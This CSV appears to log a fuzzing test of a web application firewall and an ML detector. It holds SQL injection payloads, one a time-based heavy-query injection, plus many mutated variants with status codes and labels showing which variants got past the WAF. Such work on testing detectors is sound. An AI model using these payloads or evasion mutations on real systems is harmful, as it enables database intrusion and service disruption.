Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10,Fuzzed Payload 11,Fuzzed Timestamp 11,WAF Status 11,ML Status 11,Combined Result 11,Fuzzed Payload 12,Fuzzed Timestamp 12,WAF Status 12,ML Status 12,Combined Result 12,Fuzzed Payload 13,Fuzzed Timestamp 13,WAF Status 13,ML Status 13,Combined Result 13,Fuzzed Payload 14,Fuzzed Timestamp 14,WAF Status 14,ML Status 14,Combined Result 14,Fuzzed Payload 15,Fuzzed Timestamp 15,WAF Status 15,ML Status 15,Combined Result 15,Fuzzed Payload 16,Fuzzed Timestamp 16,WAF Status 16,ML Status 16,Combined Result 16,Fuzzed Payload 17,Fuzzed Timestamp 17,WAF Status 17,ML Status 17,Combined Result 17,Fuzzed Payload 18,Fuzzed Timestamp 18,WAF Status 18,ML Status 18,Combined Result 18,Fuzzed Payload 19,Fuzzed Timestamp 19,WAF Status 19,ML Status 19,Combined Result 19,Fuzzed Payload 20,Fuzzed Timestamp 20,WAF Status 20,ML Status 20,Combined Result 20
1,2025-10-22T08:55:47.450850,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""usht"" like ""usht",403,403,403,both_correct,"1""  )    (  select   (  case when   (  0x11eb  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT 1)  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102 /*DlE*/)  ||char  (  72  )   end  )  	from   (  values  (  0   )    )     )   and   (  ""usht"" like ""usht",2025-10-22T08:55:59.884189,403,403,both_correct,"1""  )    (  select   (  case when   (  0x11eb  =  4432=4432  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR 0  )  ||char  ( /**/'|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT 1)  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102 /**/)  ||char  (  0x48  )   end  )   from   (  values  (  0   )    )     )   and   (  ""usht"" like ""usht",2025-10-22T08:56:17.929645,403,403,both_correct," AND 1""  )    (  select   (  case when   (  0x11eb  =  4432='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR 0  )  ||char  (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT 1)  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  0x4c  )  ||char  (  65  )  ||char  (  102 /**/)  ||char  (  0x48  )   end  )   from   (
 values  (  0   )    )     )   and   (  ""usht"" like ""usht",2025-10-22T08:56:33.974290,200,403,waf_incorrect_ml_correct," ANd 1""  )   	(  select   (  case when   (  0x11eb  =  4432='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR 0  )  ||char  (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT 1)  )  ,null /**/)  ,0x0  )  ,500000000  )  ,null  )   else char  (  0x4c  )  ||char  (   OR 0  )  ||char  (  8909 LIKE 8909 /*@8c*/)  ||char  (  0x48  )   end  )   from   (
 values  (  0   )    )     )   and   (  ""usht"" like ""usht",2025-10-22T08:56:50.530702,200,403,waf_incorrect_ml_correct," And 1""  )    (  select   (  case when   (  0x11eb  =  4432='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR 0  )  ||char  (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null /**/)  ,0x0  )  , OR 0  )  ,null  )   else char  (  0x4c  )  ||char  (  /**/OR (SELECT 0)  )  ||char  (  8909 LIKE 8909 /**/)  ||char  (  0x48  )   end  )   from   (
 values  (  0   )    )     )   and   (  ""usht"" like ""usht",2025-10-22T08:57:07.256020,200,403,waf_incorrect_ml_correct," and  OR 0""  )    (  select   (  case when   (  0x11eb  =  4432='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR 0  )  ||char  (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR 'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (  /**/OR (SELECT 0)  )  ||char  (  8909 LIKE 8909 /**/)  ||char  (  0x48  )   end  )   from   (	 values  (  0x0   )    )     )   and   (  ""usht"" like ""usht",2025-10-22T08:57:23.819892,200,403,waf_incorrect_ml_correct," AND  || 0""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT 0)  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/**/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (  /**/OR (SELECT  OR 0)  )  ||char  (  8909 LIKE 8909 /**/)  ||char  (  0x48  )   end  )   from   (	 values  (  0x0   )    )     )   and   (  ""usht"" like ""usht",2025-10-22T08:57:40.180513,200,403,waf_incorrect_ml_correct," AND  ||  OR 2027 like 2027""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT 0)  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/**/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR 0)  )  ||char  (  8909 LIKE 0x22cd /**/)  ||char  (  0x48  )   end  )   from   (
 values  (  0x0   )    )     )   and   (  ""usht"" like ""usht",2025-10-22T08:57:57.347183,200,403,waf_incorrect_ml_correct," And   oR   OR 2027 LikE 2027""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT 0)  )  ||char	 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/**/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR 0)  )  ||char  (  (SELECT 0x1) NOT LIKE 6338 LIKE 0x22cd /**/)  ||char  (  0x48  )   end  )   from   (
 values  (  0x0   )    )     )   and   ( /*m]D1*/""usht"" like ""usht",2025-10-22T08:58:13.869162,200,403,waf_incorrect_ml_correct," aND   OR   || 0x7eb lIKE 55 NOT LIKE 56""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT 0)  )  ||char	 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/**/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR 0)  )  ||char  (  (SELECT 0x1) NOT LIKE  AND 1 LIKE 0x22cd /**/)  ||char  (  0x48  )   end  )   from   (  values  (  0x0   )    )     )  /**/and   ( /**/""usht"" like ""usht",2025-10-22T08:58:30.314882,200,403,waf_incorrect_ml_correct," ANd   or    or  0x7eb lIKE 55 NOT LIKE 56""  )    (  select   (  case
when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT 0))  )  ||char	 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/**/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR 0)  )  ||char  (  (SELECT 0x1) NOT LIKE  AND 2671!= OR 0 LIKE 0x22cd /**/)  ||char  ( /**/0x48  )   end  )   from   (  values  (  0x0   )    )     )  /**/and   ( /**/""usht"" like ""usht",2025-10-22T08:58:46.953289,200,403,waf_incorrect_ml_correct," aNd   Or    Or  0x7eb liKE  AnD 1 not like 56""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT/**/0))  )  ||char	 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/*!4*/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR '<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE  AND (SELECT 2671)!= OR 0 LIKE 0x22cd /**/)  ||char  ( /**/0x48  )   end  )   from   (  values  (  0x0   )    )     )  /**/and   ( /**/""usht"" like ""usht",2025-10-22T08:59:04.852011,403,403,both_correct," and   oR    or  0x7eb like  and 1 not like (SELECT 1)""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT/*uh0T*/0))  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/*!4*/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR '<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE  AND (SELECT 0xa6f)!= OR 'P$+'<>'P$+V' LIKE 0x22cd  )  ||char  ( /**/0x48  )   end  )   from   (  values  (  0x0   )    )     )  /**/and   ( /**/""usht"" like ""usht",2025-10-22T08:59:21.329435,403,403,both_correct," ANd   OR    or  0x7eb LIKe  ANd 6036 LIKE 6036 not like (selEcT  OR 0)""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT/*uh0T*/0x0))  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/*!4*/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR '<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE 
AND (SELECT 0xa6f)!= OR 'P$+'<>'P$+V' LIKE 0x22cd  )  ||char  ( /**/0x48  )   end  )   from   (  values  (  0x0   )    )     )   and   ( /**/""usht"" like ""usht",2025-10-22T08:59:39.968747,403,403,both_correct," and   oR    or  0x7eb lIKE  ANd 6036 likE '~ OR 0|'='~0x10|' not like (SeLEct  oR 0)""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT/*uh0T*/0x0))  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/**/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR '<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE 
AND (SELECT 0xa6f)!= OR 'P$+'<>'P$+V' LIKE 0x22cd  )  ||char  (  0x48  )   end  )   from   (  values	 (  0x0   )    )     )   and   ( /**/""usht"" like ""usht",2025-10-22T08:59:59.927385,403,403,both_correct," aNd   OR    or  0x7eb Like  and (SeLecT 'UM' NOT LIKE 'UM.') lIke '~ OR  OR 0|' lIKE '~0x10|' not like (selEct  OR 0)""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring/**/ (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT/*uh0T*/0x0))  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/**/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR
'<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE 
AND (SELECT 0xa6f)!= OR 'P$+'<>'P$+V' LIKE 0x22cd  )  ||char  (  0x48  )   end  )   from   (  values	 (  0x0   )    )     )   and   ( /**/""usht"" like ""usht",2025-10-22T09:00:19.416363,403,403,both_correct," And   OR    or  0x7eb liKE  AND (SeLEct 'UM' NOT LIKE 'UM.') LikE '~ OR  OR 'j}(SELECT  or 0)' NOT LIKE 'j}3h'|' lIKe '~0x10|' not like (sElECt  OR 0)""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT/*uh0T*/0x0))  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR/**/'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR
'<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE  AND (SELECT 0xa6f)!= OR 'P$+'<>'P$+V' LIKE 0x22cd  )  ||char  (  0x48  )   end  )   from   (  values	 (  0x0   )    )     )   and   ( /*:?U*/""usht"" like ""usht",2025-10-22T09:00:35.413368,403,403,both_correct," AND   OR    OR  0x7eb lIke  and (sElecT 'UM' NOT LIKE 'UM.') lIke '~ OR  OR 'j}(seleCt  Or 0x19a0<>6561)' NOT LIKE 'j}3h'|' liKe '~0x10|' not like (seLEcT  Or (SelECT 1))""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT/**/0x0))  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR 'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR
'<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE  AND (SELECT 0xa6f)!= OR 'P$+'<>'P$+V' LIKE 0x22cd  )  ||char  (  0x48  )   end  )   from   (  values  (  0x0   )    )     )   and   ( /*:?U*/""usht"" like ""usht",2025-10-22T09:00:54.942879,403,403,both_correct," AND   Or    Or  0x7eb lIKe  aND (SeLEcT 'UM' NOT LIKE 'UM.') liKe '~ OR  OR 'j}(SElect  OR 0x19a0<>0x19a1)' NOT LIKE 'j}3h'|' LIKE '~0x10|' not like (seLEcT  or (sELeCT  aND 4884 like 4884))""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR/**/(SELECT (SELECT/**/0x0))  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR 'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR	'<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE  AND (SELECT 0xa6f)!= OR 'P$+'<>'P$+V' LIKE 0x22cd  )  ||char  (  0x48  )   end  )   from   (  values  (  0x0   )    )     )   and   ( /*N*/""usht"" like ""usht",2025-10-22T09:01:12.339183,403,403,both_correct," And   or    or  0x7eb lIkE  ANd (seLEct 'UM' NOT LIKE 'UM.') LiKE '~ OR  OR 'j}(seLECT  or 0x19a0<>0x19a1)' NOT LIKE 'j}3h'|' like '~0x10|' not like (SeLect  Or (SeLeCT  And  OR 499!=500 lIKE 0x1314))""  )    (  select   (  case when   (  0x11eb  =  'c' NOT LIKE 'c+'='>'='>'  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (   OR (SELECT (SELECT/**/0x0))  )  ||char
 (  '|)\' NOT LIKE '|)\E'  )  ||char  (  (SELECT '(+W' LIKE '(+W')  )  ,null  )  ,0x0  )  , OR 'Dg' NOT LIKE 'Dg6'  )  ,null  )   else char  (  0x4c  )  ||char  (   OR (SELECT  OR
'<D^F' NOT LIKE '<D^F{')  )  ||char  (  (SELECT 0x1) NOT LIKE  AND (SELECT 0xa6f)!= OR 'P$+'<>'P$+V' LIKE 0x22cd  )  ||char  (  0x48  )   end  )   from   (  values  (  0x0   )    )     )   and   ( /*TY.fw*/""usht"" like ""usht",2025-10-22T09:01:31.760950,200,403,waf_incorrect_ml_correct
2,2025-10-22T09:01:52.430432,9.71E+15,200,200,200,both_correct,546 NOT LIKE 547.71E+(SeLEct/*gnYXl*/(SELECT 1)),2025-10-22T09:02:14.641313,200,403,waf_correct_ml_incorrect, OR 0	not like 0x223.71E+(seLeCT (seleCt 61!=62)),2025-10-22T09:02:40.680284,200,200,both_correct," or (SELECT 0)	not like 0x223.71E+(SElEcT (seleCT (SelecT/**/'r6BE'='r6BE') not like
62))",2025-10-22T09:03:00.744668,200,403,waf_correct_ml_incorrect, or (seLecT 70 LIKE 70)	not like 0x223.71E+(SelecT (SelECT (SELEcT 'r6BE' likE 'r6BE') not like (SELeCT 0x1))),2025-10-22T09:03:19.950473,200,403,waf_correct_ml_incorrect," OR (select (SELECT (SELECT 1)) LiKE/**/'c09'='c09')
not like 0x223.71E+(SELEct (SELEct (sEleCT 'r6BE' LIke 'r6BE') not like (sElEcT 0x1)))",2025-10-22T09:03:36.711411,200,403,waf_correct_ml_incorrect," OR (SeLecT (SeLeCT (sElEcT 0x1)) Like/*YUUGy*/'c09' LIKE/**/'c09')	not like 0x223.71E+(SelecT (SElEcT (sELect 3143 IN ( AND 1,3143,3144)) not like (SeLecT 0x1)))",2025-10-22T09:03:52.826876,200,403,waf_correct_ml_incorrect,"
|| (selEcT (sElEct (sEleCt 0x1)) LiKE 'c09' lIKE/*:t[*/'c09')	not like 0x223.71E+(selECT (SeLECt (sElecT 3143 in ( anD  OR 0,'5' LIKE '5',0xc48)) not like (sELeCt 0x1)))",2025-10-22T09:04:09.733498,403,403,both_incorrect,"
|| (selECT (seLect (SeLEcT 0x1)) lIkE 'c09'/**/lIKE/**/'c09') not like 0x223.71E+(SelECt (SelecT (SEleCt 3143 in ( and  || (seleCT 1),''a^' NOT LIKE 'a^G'' lIke '0x5',0xc48)) not like (SeLeCt 0x1)))",2025-10-22T09:04:26.662784,403,403,both_incorrect,"
|| (seLECT (SElECt (selECt 0x1)) LIKE 'c09'/*aF/!*/LIkE 'c09') not like 0x223.71E+(seLECt
(sELECT (seLect 793 NOT LIKE 794 In ( anD  || (seLEct (SelEct (sElEct 1))),''a^' NOT LIKE 'a^G'' Like '0x5',0xc48)) not like (SELEcT 0x1)))",2025-10-22T09:04:43.654630,403,403,both_incorrect,"
|| (SElect (sElECt (SeLeCT 0x1)) LikE 'c09'/*aF/!*/LIke 'c09') not like 0x223.71E+(seLeCT
(sELecT/**/(seLEcT (SELECT 1) IN (91,92,93) not like 0x31a iN ( anD
 || (seLEct (SELect (SElect 1))),''a^' NOT LIKE 'a^G'' LikE '0x5',0xc48)) not like (seLECT 0x1)))",2025-10-22T09:04:59.922478,403,403,both_incorrect,"	 OR  (sElECt (SELECT (SELEct 0x1)) LIkE 'c09'/*aF/!*/likE 'c09') not like 0x223.71E+(SElecT
(sElect (selEcT (sELEcT 1) IN (91,92,93) not like 0x31a In ( anD
 || (sELEcT (SeleCT (SelEct (seLeCt 9654<>(SELECT 1))))),''a^' NOT LIKE 'a^G'' LiKe '0x5',0xc48)) not like (SeLEct 0x1)))",2025-10-22T09:05:15.473744,403,403,both_incorrect,"
 OR  (SELeCT (seLeCt (SELecT 0x1)) liKE 'c09'/*aF/!*/LiKe 'c09') not like 0x223.71E+(sEleCt
(SeLeCt (SeLeCt (sEleCT 1) in ((SELECT 91),92, ANd 860<>861) not like 0x31a/**/iN ( anD
  or  (sElEct (sElecT (sEleCT (seleCT 9654<>(sELEct 1))))),''a^' NOT LIKE 'a^G'' liKE '0x5',0xc48)) not like (sElECt 0x1)))",2025-10-22T09:05:31.570926,403,403,both_incorrect,"
 Or  (sElEct (SELEcT (SelECT 0x1)) lIKE 'c09'/*aF/!*/LikE 'c09') not like 0x223.71E+(SeLEcT	(sElEcT/**/(SelECt (selEcT 1) In ((SElECt (seLeCt 91)),92, And 860 NOT LIKE 7355 IN ( AND 1,7355,7356)) not like 0x31a/**/IN ( aNd
  OR  (SELeCT (SeLecT (select (seLEct 9654<>(seLECT 1))))),''a^' NOT LIKE 'a^G'' lIkE '0x5',0xc48)) not like (SeLECt 0x1)))",2025-10-22T09:05:48.729918,403,403,both_incorrect,"
 oR  (SELect (SELEcT (SelEct	0x1)) lIKE 'c09'/*aF/!*/LiKe 'c09') not like 0x223.71E+(SeLeCT	(sElEct/**/(SElECt (sElecT 1) In ((SeleCt (SeLECt 91)),1182 IN (1181,1182,1183),/**/anD 860 NOT LIKE (SELECT (SELECT 1)) iN ( AnD 1,7355,7356)) not like 0x31a/**/in ( aNd
  Or  (SElEct (sELEcT (sElEcT (SeLECT 9654!=(selEcT 1))))),''a^' NOT LIKE 'a^G'' LIkE '0x5',0xc48)) not like (SElECt 0x1)))",2025-10-22T09:06:05.684427,200,403,waf_correct_ml_incorrect,"
 or  (SELEcT (sELecT (sELECT	0x1)) LIkE 'c09'/*aF/!*/LiKe 'c09') not like 0x223.71E+(selEct	(SELect/**/(SeleCt (SelecT 1) In ((SeLecT (SeLecT
91)), And 1 In (1181,1182,1183),/*H8{#*/and 860 not like (SElEcT (SeLECT 1)) in ( ANd 1,7355,(sEleCT 7356))) not like 0x31a/**/In ( anD
  Or  (SELECT (SelecT (sElEct/**/(SElEct 9654!=(SELeCt 8759<>8760))))),''a^' NOT LIKE 'a^G'' LiKE '0x5',0xc48)) not like (SELect 0x1)))",2025-10-22T09:06:23.354503,200,403,waf_correct_ml_incorrect,"
 OR  (seleCt (seLeCt (seLEct	0x1)) lIke 'c09'/*aF/!*/LIke 'c09') not like 0x223.71E+(seLect	(SelECT/**/(selEct (sELeCt 1) iN ((seLeCt (SELEct
91)), aNd  oR 0 IN (1181,4146 IN (4145,4146,4147),1183),/*H8{#*/aND 860 not like (SeLeCt (SElect 1)) in ( aND 1,7355,(sElECT 7356))) not like 0x31a in ( AND
 
or  (SeLeCT (SeLect (SEleCt/**/(SelEct 9654<>(SeLECt 0x2237<>8760))))),''a^' NOT LIKE 'a^G'' liKe '0x5',0xc48)) not like (sElect 0x1)))`I",2025-10-22T09:06:42.928524,403,403,both_incorrect,"
 OR  (SELECT (seLEcT (seLEcT	0x1)) LIkE 'c09'/*aF/!*/Like 'c09') not like 0x223.71E+(sELect	(SeLeCt/**/(selECT (SElEcT '@hef;'<>'@hef;C') IN ((SeLECT (SeLEcT
91)), And  or 0 IN (1181,4146 IN (4145,4146, AND 1),1183),/**/AnD 860 not like (SElEct (SeLecT 1)) in (
And 1,7355,(SELEcT 7356))) not like 0x31a in ( AnD
 
Or  (selECT (selecT (SElEcT (sELeCT (selECT 9654)<>(seLeCT 0x2237<>8760))))),''a^' NOT LIKE 'a^G'' lIke '0x5',0xc48)) not like (sEleCT 0x1)))`IA)",2025-10-22T09:07:01.772140,403,403,both_incorrect,"
 or  (SElEct (sElect (sELeCt	0x1)) LIkE/**/'c09'/*aF/!*/LikE 'c09') not like 0x223.71E+(selecT (seleCT/**/(seLECt (seLecT '@hef;'<>'@hef;C') iN ((SELeCT (seLect
(SELECT 0x1))), aND  Or 0 In (1181,4146 iN (4145,4146, AND 1),1183),/**/aND 860 not like (seLECT (seLECt 1)) in (
anD 1,'_)6' NOT LIKE '_)6`',(selecT 7356))) not like 0x31a iN ( and
 
oR  (seLEcT (SeLecT (sELEct (SelecT (SElECt 9654)<>(selecT 0x2237<>8760))))),''a^' NOT LIKE 'a^G'' like '0x5',0xc48)) not like (seLeCT 0x1)))`IA)",2025-10-22T09:07:18.471674,403,403,both_incorrect,"
 Or  (selEcT (sElect (selECt
0x1)) likE/**/'c09'/*aF/!*/like 'c09') not like 0x223.71E+(sELEct (sElEct/**/(sELECT (sElEcT '@hef;'<>'@hef;C') IN ((seLeCT (SElecT
(sElEcT 0x1))), AnD  oR 0 in (0x49d,4146 in (4145,4146, AND 1),1183),/**/AND 860 not like (selECt (selEct 1)) iN/**/(
And 1,'_)6' NOT LIKE '_)6`',(SEleCt 7356))) not like 0x31a In ( aNd
 
OR  (SelECt (sELeCt (seLECT (sElect (selECt  oR 0)<>(SeleCT 0x2237 not like 'd'!='dK'))))),''a^' NOT LIKE 'a^G'' LikE '0x5',0xc48)) not like (sEleCt 0x1)))`IA)",2025-10-22T09:07:40.047032,403,403,both_incorrect,"
 oR  (SelEcT (sEleCT (seLEct
0x1)) like 'c09'/*aF/!*/likE 'c09') not like 0x223.71E+(sEleCt (Select/**/(seLeCt (SElecT '@hef;'<>'@hef;C') in ((SELECt (seLECT
(sELECT 0x1))), And  Or 0 In (0x49d, OR 0 IN (4145,4146, ANd 1),1183),/**/aNd 860 not like (SEleCT (seLEcT '?' NOT LIKE '?e')) iN/**/(
AND 1,'_)0x6' NOT LIKE '_)6`',(sElecT 7356))) not like 0x31a In ( aND  
||  (SEleCt (sElecT (sElEct (SeLECT (seLEct  oR 0)<>(seLecT 0x2237 not like 'd'!='dK'))))),''a^' NOT LIKE 'a^G'' liKe '0x5',0xc48)) not like (SeleCt 0x1)))`IA)",2025-10-22T09:07:59.040257,403,403,both_incorrect
